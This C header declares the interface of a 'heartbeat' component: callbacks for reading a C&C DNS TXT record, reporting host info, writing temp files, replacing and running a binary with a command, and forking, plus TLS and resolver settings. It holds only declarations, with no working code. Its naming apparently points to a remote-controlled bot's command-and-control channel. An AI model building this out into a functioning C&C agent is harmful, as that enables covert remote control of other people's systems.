/*
* Copyright (c) 2019-2021 David Timber <mieabby@gmail.com>
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/
#pragma once
#include "pth.h"
#include "resolv.h"
#include "protocol.h"
#include "pack.h"

#include <mbedtls/ssl.h>


struct prne_htbt;
typedef struct prne_htbt prne_htbt_t;
typedef struct prne_htbt_param prne_htbt_param_t;
typedef struct prne_htbt_cbset prne_htbt_cbset_t;
typedef bool(*prne_htbt_cnc_txtrec_ft)(void *ctx, char *out);
typedef bool(*prne_htbt_hostinfo_ft)(void *ctx, prne_htbt_host_info_t *out);
typedef int(*prne_htbt_tmpfile_ft)(
	void *ctx,
	const int flags,
	const mode_t mode,
	size_t req_size,
	char **path);
typedef bool(*prne_htbt_bin_ft)(
	void *ctx,
	const char *path,
	const prne_htbt_cmd_t *cmd);
typedef bool(*prne_htbt_fork_ft)(void *ctx);

struct prne_htbt_cbset {
	// All callback functions are optional.
	prne_htbt_cnc_txtrec_ft cnc_txtrec;
	prne_htbt_hostinfo_ft hostinfo;
	prne_htbt_tmpfile_ft tmpfile;
	prne_htbt_bin_ft upbin;
	prne_htbt_fork_ft fork;
};

struct prne_htbt_param {
	mbedtls_ssl_config *lbd_ssl_conf;
	mbedtls_ssl_config *main_ssl_conf;
	mbedtls_ctr_drbg_context *ctr_drbg;
	prne_resolv_t *resolv;
	prne_htbt_cbset_t cb_f;
	void *cb_ctx;
	const prne_rcb_param_t *rcb;
	int blackhole;
};


prne_htbt_t *prne_alloc_htbt (prne_worker_t *w, const prne_htbt_param_t *param);

void prne_htbt_init_param (prne_htbt_param_t *p);
void prne_htbt_free_param (prne_htbt_param_t *p);
